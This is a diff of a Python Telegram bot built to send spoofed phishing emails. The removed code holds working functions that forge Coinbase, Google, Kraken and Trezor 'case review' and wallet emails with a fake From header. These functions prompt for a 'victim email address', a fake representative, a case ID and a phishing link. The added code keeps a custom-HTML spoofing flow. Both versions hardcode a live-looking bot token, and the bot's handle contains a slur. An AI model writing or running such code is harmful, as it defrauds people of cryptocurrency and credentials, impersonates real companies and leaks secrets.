@@ -121,32 +121,53 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         "SOL: CmnkLiqxRh5cAMWLx3EewLn3Mpxw7KJbj7ox6hGPKX3p\n"
         "LTC: LNQpZvqp2BkaDoSviNMU7zATzNxxUyhvfP"
     )
-    await update.message.reply_text(donate_message)
+    if update.message:
+        await update.message.reply_text(donate_message)
+    elif update.callback_query:
+        await update.callback_query.message.reply_text(donate_message)
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     start_message = (
-        "Welcome to @NiggaSpoofer\n"
-        "Support: @un0h4na\n\n"
+        "Welcome to @NSpoofer\n"
+        "Support: @un0h4na or @AlyaHidesHerFeelingsInTypeScript\n\n"
         "This project is funded by donations!\n"
         "If you want me to eat and keep the SMTPs fresh, feel free to do /donate\n\n"
         "USE CUSTOM MAIL AND HTML FOR COINBASE\n"
         "[Dono Leaderboard]\n\n"
         "[1] Anonymous - 2.3$\n"
-        "[2]Anonymous - 1$\n"
-        "[3]\n\n"
+        "[2] Anonymous - 1$\n"
+        "[3] Anonymous - 1$\n\n"
         "[Info]\n\n"
         f"• Mails sent: {global_email_count}\n"
         f"• Your mails sent: {user_email_counts.get(str(update.effective_user.id), 0)}\n"
     )
 
     keyboard = [
-        [KeyboardButton("Misc")],
-        [KeyboardButton("Spoofing"), KeyboardButton("/donate")]
+        [InlineKeyboardButton("Spoofer", callback_data="Spoofer")],
+        [InlineKeyboardButton("Donate", callback_data="/donate")],
+        [InlineKeyboardButton("Account", callback_data="/id")],
+        [InlineKeyboardButton("Help", callback_data="/help")]
     ]
 
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+
+    reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(start_message, reply_markup=reply_markup)
+
+
+async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+
+    if data == "custom_mail":
+        await custom_mail(update, context)
+    elif data == "/donate":
+        await donate(update, context)
+    elif data == "/id":
+        await get_user_id(update, context)
+    elif data == "/help":
+        await help_command(update, context)
 
 async def misc_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     keyboard = [
@@ -157,12 +178,6 @@ async def misc_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
     await update.message.reply_text("Misc Menu:", reply_markup=reply_markup)
 
-async def coinbase_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    keyboard = [
-        [KeyboardButton("/employee_coinbase"), KeyboardButton("/wallet_coinbase")],
-        [KeyboardButton("/secure_coinbase"), KeyboardButton("/coinbase_delay")],
-        [KeyboardButton("Back to Main Menu")]
-    ]
 
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
     await update.message.reply_text("Coinbase Menu:", reply_markup=reply_markup)
@@ -196,11 +211,18 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "   Then, just add a directory like `/help` and spoof `iceprivacy@ice\\.gov/help`\\.\n\n"
         "I won't explain the technicals here because it would suck\\! 😉 Happy spoofing\\! 🚀"
     )
-    await update.message.reply_text(help_text, parse_mode="MarkdownV2")
+    if update.message:
+        await update.message.reply_text(help_text, parse_mode="MarkdownV2")
+    elif update.callback_query:
+        await update.callback_query.message.reply_text(help_text, parse_mode="MarkdownV2")
+
 
 async def get_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
-    await update.message.reply_text(f"Your user ID is: {user_id}")
+    if update.message:
+        await update.message.reply_text(f"Your user ID is: {user_id}")
+    elif update.callback_query:
+        await update.callback_query.message.reply_text(f"Your user ID is: {user_id}")
 
 
 
@@ -256,9 +278,10 @@ async def get_recipients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Initiates the custom email flow."""
-
-
-    await update.message.reply_text("Enter the victim email address:")
+    if update.message:
+        await update.message.reply_text("Enter the victim email address:")
+    elif update.callback_query:
+        await update.callback_query.message.reply_text("Enter the victim email address:")
     return CUSTOM_VICTIM_EMAIL
 
 async def get_custom_victim_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -328,78 +351,6 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         await update.message.reply_text("Please upload a valid HTML file.")
         return CUSTOM_HTML
 
-async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Coinbase wallet email, asks only for the seed phrase."""
-    
-
-    context.user_data.clear()
-    context.user_data["conversation"] = "wallet_coinbase"
-    await update.message.reply_text("Enter the victim email address:")
-    return RECIPIENTS
-
-async def employee_google(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-
-    context.user_data.clear()
-    context.user_data["conversation"] = "employee_google"
-    await update.message.reply_text("Enter the victim email address:")
-    return RECIPIENTS
-
-async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for secure Coinbase emails with balance deduction."""
-
-
-    context.user_data.clear()
-    context.user_data["conversation"] = "secure_coinbase"
-    await update.message.reply_text("Enter the victim email address:")
-    return RECIPIENTS
-
-async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Coinbase employee email with balance deduction."""
-
-
-    context.user_data.clear()
-    context.user_data["conversation"] = "employee_coinbase"
-    await update.message.reply_text("Enter the victim email address:")
-    return RECIPIENTS
-
-async def spoof_email_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    query = update.callback_query
-    await query.answer()
-    context.user_data["display_email"] = query.data
-    await query.edit_message_text(text=f"Spoofing email as: {query.data}")
-
-    if context.user_data.get("conversation") == "coinbase_delay":
-        await query.message.reply_text("Enter the amount and token symbol for the transaction (e.g., '1000 USDC' or '1 BTC'):")
-        return AMOUNT_TOKEN
-    elif context.user_data.get("conversation") == "wallet_coinbase":
-        await query.message.reply_text("Enter the seed phrase:")
-        return SEED_PHRASE
-    else:
-        await query.message.reply_text("Enter the representative name:")
-        return REPRESENTATIVE
-
-    
-async def get_amount_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    try:
-
-        user_input = update.message.text.strip().split()
-        if len(user_input) != 2:
-            await update.message.reply_text("Please enter a valid amount and token symbol, e.g., '1000 USDC'.")
-            return AMOUNT_TOKEN
-        
-    
-        amount = (user_input[0])
-        token_symbol = user_input[1].upper()
-
-        context.user_data["amount"] = amount
-        context.user_data["token_symbol"] = token_symbol
-
-        await update.message.reply_text(f"Amount set to: {amount}, Token symbol set to: {token_symbol}. Now enter the delay link:")
-        return LINK
-    except ValueError:
-        await update.message.reply_text("Please enter a valid number for the amount.")
-        return AMOUNT_TOKEN
-
 
 # Add the new command handler for broadcasting messages
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -432,490 +383,6 @@ def get_all_user_ids():
                 user_id = parts[1].split(" | ")[0]
                 user_ids.add(user_id)
     return user_ids
-
-
-async def get_representative(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data["representative"] = update.message.text
-
-    if context.user_data.get("conversation") == "secure_coinbase":
-        await update.message.reply_text("Enter the case ID:")
-        return CASE_ID
-    else:
-        await update.message.reply_text("Enter the case ID:")
-        return CASE_ID
-
-async def get_case_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data["case_id"] = update.message.text
-
-    if context.user_data.get("conversation") == "employee_trezor":
-        recipients = context.user_data["recipients"]
-        representative = context.user_data["representative"]
-        case_id = context.user_data["case_id"]
-        display_email = context.user_data["display_email"]
-
-
-        message = await send_employee_trezor_email(
-            update, recipients, representative, case_id, display_email
-        )
-        await update.message.reply_text(message)
-        return ConversationHandler.END
-    elif context.user_data.get("conversation") == "employee_kraken":
-        recipients = context.user_data["recipients"]
-        representative = context.user_data["representative"]
-        case_id = context.user_data["case_id"]
-        display_email = context.user_data["display_email"]
-
-
-        message = await send_employee_kraken_email(
-            update, recipients, representative, case_id, display_email
-        )
-        await update.message.reply_text(message)
-        return ConversationHandler.END
-    elif context.user_data.get("conversation") == "secure_coinbase":
-        await update.message.reply_text("Enter the secure link:")
-        return LINK
-    elif context.user_data.get("conversation") == "employee_coinbase":
-        recipients = context.user_data["recipients"]
-        representative = context.user_data["representative"]
-        case_id = context.user_data["case_id"]
-        display_email = context.user_data["display_email"]
-
-
-        message = await send_employee_coinbase_email(
-            update, recipients, representative, case_id, display_email
-        )
-        await update.message.reply_text(message)
-        return ConversationHandler.END
-    else:
-
-        recipients = context.user_data["recipients"]
-        representative = context.user_data["representative"]
-        case_id = context.user_data["case_id"]
-        display_email = context.user_data["display_email"]
-
-        message = await send_employee_google_email(
-            update, recipients, representative, case_id, display_email
-        )
-        await update.message.reply_text(message)
-        return ConversationHandler.END
-
-
-async def get_seed_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data["seed_phrase"] = update.message.text
-    recipients = context.user_data["recipients"]
-    seed_phrase = context.user_data["seed_phrase"]
-    display_email = context.user_data["display_email"]
-
-    message = await send_wallet_coinbase_email(
-        update, recipients, seed_phrase, display_email
-    )
-    await update.message.reply_text(message)
-    return ConversationHandler.END
-
-async def get_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data["link"] = update.message.text
-
-
-    recipients = context.user_data["recipients"]
-    link = context.user_data["link"]
-    display_email = context.user_data["display_email"]  
-
-    if context.user_data.get("conversation") == "coinbase_delay":
-       
-        message = await send_coinbase_delay_email(
-            update, context, recipients, link, display_email 
-        )
-        await update.message.reply_text(message)
-        return ConversationHandler.END
-    else:
-       
-        representative = context.user_data["representative"]
-        case_id = context.user_data["case_id"]
-
-        message = await send_secure_coinbase_email(
-            update, recipients, link, representative, case_id, display_email
-        )
-        await update.message.reply_text(message)
-
-    context.user_data.clear()
-    return ConversationHandler.END
-
-
-
-
-
-async def send_employee_coinbase_email(
-    context, recipients, representative, case_id, display_email
-):
-    """Send the Employee Coinbase Email."""
-    template_path = HTML_TEMPLATE_PATH  
-
-    if not os.path.exists(template_path):
-        return "Failed to send email. Template file not found."
-
-    with open(template_path, "r", encoding="utf-8") as file:
-        html_body = file.read()
-
-   
-    html_body = html_body.replace(
-        "Daniel Greene", representative
-    ) 
-    html_body = html_body.replace("1835246", case_id)
-
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "Case Review" 
-   # msg['Reply-To'] = 'support@coinbase.com'
-    msg["From"] = f"Coinbase <{display_email}>"
-    msg["To"] = recipients
-    html_part = MIMEText(html_body, "html", "utf-8")
-    msg.attach(html_part)
-
-    try:
-  
-        with open("coinbase.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="coinbase.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
-
-        send_email_through_smtp(
-            "Coinbase",
-            smtp_details["username"],
-            "Coinbase Case Review",
-            msg,
-            recipients,
-            context.effective_user.id
-        )
-        log_email_details(context, "employee_coinbase", recipients, {"representative": representative, "case_id": case_id}) 
-        return "Coinbase Employee Mail sent successfully!"
-    except Exception as e:
-        return f"Failed to send email due to an internal error: {e}"
-
-
-
-
-async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_email):
-    """Send the Coinbase Wallet Email."""
-   
-    log_email_details(
-        context, "wallet_coinbase", recipients, {"seed_phrase": seed_phrase}
-    )
-
-    template_path = HTML_WALLET_TEMPLATE_PATH
-
-    if not os.path.exists(template_path):
-        return "Failed to send email. Template file not found."
-
-    with open(template_path, "r", encoding="utf-8") as file:
-        html_body = file.read()
-
-    html_body = html_body.replace("seed_placeholder", seed_phrase)
-
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "ACTION NEEDED: Secure your assets to self-custody"
-    #msg['Reply-To'] = 'support@coinbase.com'
-    msg["From"] = f"Coinbase <{display_email}>"
-    msg["To"] = recipients
-    html_part = MIMEText(html_body, "html", "utf-8")
-    msg.attach(html_part)
-
-    try:
-        with open("wallet.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="wallet_coinbase.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
-
-        send_email_through_smtp(
-            "Coinbase",
-            smtp_details["username"],
-            "Secure your assets to self-custody",
-            msg,
-            recipients,
-            context.effective_user.id
-        )
-        return "Coinbase Wallet Mail sent successfully!"
-    except Exception as e:
-        return f"Failed to send email due to an internal error: {e}"
-
-async def send_secure_coinbase_email(
-    context, recipients, link, representative, case_id, display_email
-):
-    """Send the Secure Coinbase Email with a link and attached images."""
-    template_path = HTML_SECURE_TEMPLATE_PATH
-
-    if not os.path.exists(template_path):
-        return "Failed to send email. Template file not found."
-
-    with open(template_path, "r", encoding="utf-8") as file:
-        html_body = file.read()
-
-
-    html_body = html_body.replace("Daniel Greene", representative)
-    html_body = html_body.replace("1835246", case_id)
-    html_body = html_body.replace("https://link.com", link)
-
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "Secure Coinbase Token"
-    msg["From"] = f"Coinbase <{display_email}>"
-    msg["To"] = recipients
-    html_part = MIMEText(html_body, "html", "utf-8")
-    msg.attach(html_part)
-
-
-    try:
-        with open("coinbase.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="coinbase.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
-
-        send_email_through_smtp(
-            "Coinbase",
-            smtp_details["username"],
-            "Secure Coinbase Token",
-            msg,
-            recipients,
-            context.effective_user.id
-        )
-        log_email_details(context, "secure_coinbase", recipients, {"link": link}) 
-        return "Coinbase Secure Link Mail sent successfully!"
-    except Exception as e:
-        return f"Failed to send email due to an internal error: {e}"
-
-async def send_employee_google_email(
-    context, recipients, representative, case_id, display_email
-):
-    """Send the Employee Google Email with attached images."""
-
-    log_email_details(
-        context,
-        "employee_google",
-        recipients,
-        {"representative": representative, "case_id": case_id},
-    )
-
-    template_path = HTML_GOOGLE_TEMPLATE_PATH
-
-    if not os.path.exists(template_path):
-        return "Failed to send email. Template file not found."
-
-    with open(template_path, "r", encoding="utf-8") as file:
-        html_body = file.read()
-
-
-    html_body = html_body.replace("Daniel Greene", representative)
-    html_body = html_body.replace("1835246", case_id)
-
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "Case Review"
-    msg['Reply-To'] = 'no-reply@google.com'
-    msg["From"] = f"<{display_email}>"
-    msg["To"] = recipients
-    html_part = MIMEText(html_body, "html", "utf-8")
-    msg.attach(html_part)
-
-
-    try:
-        with open("google_logo.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="google_logo.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
-
-        send_email_through_smtp(
-            "Google", smtp_details["username"], "Google Case Review", msg, recipients, context.effective_user.id
-        )
-        return "Google Employee Mail sent successfully!"
-    except Exception as e:
-        return f"Failed to send email due to an internal error: {e}"
-
-async def employee_kraken(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Kraken employee email with balance deduction."""
-
-
-    context.user_data.clear()
-    context.user_data["conversation"] = "employee_kraken"
-    await update.message.reply_text("Enter the victim email address:")
-    return RECIPIENTS
-
-async def employee_trezor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Trezor employee email with balance deduction."""
-
-    context.user_data.clear()
-    context.user_data["conversation"] = "employee_trezor"
-    await update.message.reply_text("Enter the victim email address:")
-    return RECIPIENTS
-
-
-async def send_employee_trezor_email(
-    context, recipients, representative, case_id, display_email
-):
-    """Send the Employee Trezor Email."""
-    template_path = HTML_TREZOR_TEMPLATE_PATH 
-
-    if not os.path.exists(template_path):
-        return "Failed to send email. Template file not found."
-
-    with open(template_path, "r", encoding="utf-8") as file:
-        html_body = file.read()
-
-  
-    html_body = html_body.replace("Daniel Greene", representative)
-    html_body = html_body.replace("1386215", case_id)
-
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "Your case is under review"
-    msg["From"] = f"Trezor <{display_email}>"
-    msg['Reply-To'] = 'help@trezor.io'
-    msg["To"] = recipients
-    html_part = MIMEText(html_body, "html", "utf-8")
-    msg.attach(html_part)
-
-    try:
-     
-        with open("trezor.png", "rb") as img_file:
-           
-            img = MIMEImage(img_file.read(), name="trezor.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
-
-        send_email_through_smtp(
-            "Trezor",
-            smtp_details["username"],
-            "Your case is under review",
-            msg,
-            recipients,
-            context.effective_user.id
-        )
-        log_email_details(context, "employee_trezor", recipients, {"representative": representative, "case_id": case_id})
-        return "Trezor Employee Mail sent successfully!"
-    except Exception as e:
-        return f"Failed to send email due to an internal error: {e}"
-
-
-
-async def spoof_email_choice_kraken(
-    update: Update, context: ContextTypes.DEFAULT_TYPE
-) -> int:
-    """Handles the spoof email choice for Kraken."""
-    query = update.callback_query
-    await query.answer()
-    context.user_data["display_email"] = query.data
-    await query.edit_message_text(text=f"Spoofing email as: {query.data}")
-
-   
-    await query.message.reply_text("Enter the representative name:")
-    return REPRESENTATIVE
-
-async def send_employee_kraken_email(
-    context, recipients, representative, case_id, display_email
-):
-    """Send the Employee Kraken Email with attached images."""
-   
-    log_email_details(
-        context,
-        "employee_kraken",
-        recipients,
-        {"representative": representative, "case_id": case_id},
-    )
-
-    template_path = "kraken.html"
-
-    if not os.path.exists(template_path):
-        return "Failed to send email. Template file not found."
-
-    with open(template_path, "r", encoding="utf-8") as file:
-        html_body = file.read()
-
- 
-    html_body = html_body.replace("Daniel Greene", representative)
-    html_body = html_body.replace("1835246", case_id)
-
-  
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "Your case is under review"
-    msg['Reply-To'] = 'no-reply@kraken.com'
-    msg["From"] = f"Kraken <{display_email}>"
-    msg["To"] = recipients
-    html_part = MIMEText(html_body, "html", "utf-8")
-    msg.attach(html_part)
-
-
-    for image in ["kraken.png", "kraken1.png", "kraken2.png"]:
-        try:
-            with open(image, "rb") as img_file:
-                img = MIMEImage(img_file.read(), name=image)
-                img.add_header("Content-ID", f"<{image}>")
-                msg.attach(img)
-        except Exception as e:
-            return f"Failed to attach the image {image}: {e}"
-
-    try:
-        send_email_through_smtp(
-            "Kraken",
-            smtp_details["username"],
-            "Your case is under review",
-            msg,
-            recipients,
-            context.effective_user.id
-        )
-        return "Kraken Employee Mail sent successfully!"
-    except Exception as e:
-        return f"Failed to send email due to an internal error: {e}"
-
-async def coinbase_delay(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the flow for sending a Coinbase delay email."""
-
-    context.user_data.clear()
-    context.user_data["conversation"] = "coinbase_delay"
-    await update.message.reply_text("Enter the victim email address:")
-    return RECIPIENTS
-
-
-
-async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAULT_TYPE, recipients, link, display_email):
-    """Send the Coinbase Delay Email with the manual review link."""
-    template_path = HTML_DELAY_TEMPLATE_PATH
-
-    if not os.path.exists(template_path):
-        return "Failed to send email. Template file not found."
-
-    amount = context.user_data.get("amount", 0)
-    token_symbol = context.user_data.get("token_symbol", "USDC")
-
-    with open(template_path, "r", encoding="utf-8") as file:
-        html_body = file.read()
-
-
-    html_body = html_body.replace("529.75", f"{amount}")
-    html_body = html_body.replace("USDC", token_symbol)
-    html_body = html_body.replace("Cancel my <b>529.75 USDC</b>", f"Cancel my <b>{amount} {token_symbol}</b>")
-    html_body = html_body.replace("https://link.com", link)
-
-    msg = MIMEMultipart("related")
-    msg["Subject"] = "A manual review is pending"
-    #    msg['Reply-To'] = 'support@coinbase.com'
-    msg["From"] = f"Coinbase <{display_email}>"
-    msg["To"] = recipients
-    html_part = MIMEText(html_body, "html", "utf-8")
-    msg.attach(html_part)
-
-    try:
-        with open("coinbase.png", "rb") as img_file:
-            img = MIMEImage(img_file.read(), name="coinbase.png")
-            img.add_header("Content-ID", "<logo>")
-            msg.attach(img)
-
-        send_email_through_smtp(
-            "Coinbase",
-            smtp_details["username"],
-            "A manual review is pending",
-            msg,
-            recipients,
-            context.effective_user.id
-        )
-        log_email_details(update, "coinbase_delay", recipients, {"link": link, "amount": amount, "token_symbol": token_symbol})
-        return "Coinbase Delay Email sent successfully!"
-    except Exception as e:
-        return f"Failed to send email due to an internal error: {e}"
-
 
 
 # Add the new conversation handler for broadcasting messages
@@ -957,127 +424,16 @@ def main():
     load_email_counts()
 
 
-    TOKEN = "8161193786:AAEw62XKG_beqNdVGGDBH4eEji6KLFLBHNU"
+    TOKEN = "8157065921:AAGzZPW0q-2aSs4Pcg_E0qBGV2v3RkHVjEA"
     application = ApplicationBuilder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("id", get_user_id))
 
-    wallet_coinbase_handler = ConversationHandler(
-        entry_points=[CommandHandler("wallet_coinbase", wallet_coinbase)],
-        states={
-            RECIPIENTS: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
-            ],
-            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
-            SEED_PHRASE: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_seed_phrase)
-            ],
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-    )
 
-    employee_coinbase_handler = ConversationHandler(
-        entry_points=[CommandHandler("employee_coinbase", employee_coinbase)],
-        states={
-            RECIPIENTS: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
-            ],
-            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
-            REPRESENTATIVE: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
-            ],
-            CASE_ID: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)
-            ], 
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-    )
-
-    secure_coinbase_handler = ConversationHandler(
-        entry_points=[CommandHandler("secure_coinbase", secure_coinbase)],
-        states={
-            RECIPIENTS: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
-            ],
-            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
-            REPRESENTATIVE: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
-            ],
-            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
-            LINK: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)
-            ], 
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-    )
-
-    employee_google_handler = ConversationHandler(
-        entry_points=[CommandHandler("employee_google", employee_google)],
-        states={
-            RECIPIENTS: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
-            ],
-            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
-            REPRESENTATIVE: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
-            ],
-            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-    )
-
-    employee_kraken_handler = ConversationHandler(
-        entry_points=[CommandHandler("employee_kraken", employee_kraken)],
-        states={
-            RECIPIENTS: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
-            ],
-            SPOOF_EMAIL: [
-                CallbackQueryHandler(
-                    spoof_email_choice_kraken
-                ) 
-            ],
-            REPRESENTATIVE: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
-            ],
-            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-    )
-
-
-    employee_trezor_handler = ConversationHandler(
-        entry_points=[CommandHandler("employee_trezor", employee_trezor)],
-        states={
-            RECIPIENTS: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
-            ],
-            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
-            REPRESENTATIVE: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
-            ],
-            CASE_ID: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)
-            ],
-        },
-        fallbacks=[CommandHandler("cancel", cancel)],
-    )
-
-
-    coinbase_delay_handler = ConversationHandler(
-    entry_points=[CommandHandler("coinbase_delay", coinbase_delay)],
-    states={
-        RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)],
-        SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
-        AMOUNT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount_token)], 
-        LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)],  
-    },
-    fallbacks=[CommandHandler("cancel", cancel)],
-)
     custom_mail_handler = ConversationHandler(
-    entry_points=[CommandHandler("custom_mail", custom_mail)],
+    entry_points=[CommandHandler("Spoofer", custom_mail)],
     states={
         CUSTOM_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_victim_email)],
         CUSTOM_SUBJECT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_subject)],
@@ -1090,20 +446,10 @@ def main():
 
 
     application.add_handler(custom_mail_handler)
-    application.add_handler(CommandHandler("donate", donate))
-    #application.add_handler(coinbase_delay_handler)
-    application.add_handler(employee_trezor_handler)
-    application.add_handler(employee_kraken_handler)
-    application.add_handler(wallet_coinbase_handler)
-    #application.add_handler(employee_coinbase_handler)
-    #application.add_handler(secure_coinbase_handler)
-    application.add_handler(employee_google_handler)
+
     application.add_handler(broadcast_handler)
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.Regex("Misc"), misc_menu))
-    #application.add_handler(MessageHandler(filters.Regex("Coinbase"), coinbase_menu))
-    application.add_handler(MessageHandler(filters.Regex("Spoofing"), other_menu))
-    application.add_handler(MessageHandler(filters.Regex("Back to Main Menu"), back_to_main_menu))
+    application.add_handler(CallbackQueryHandler(handle_callback_query))
 
     application.run_polling()
 
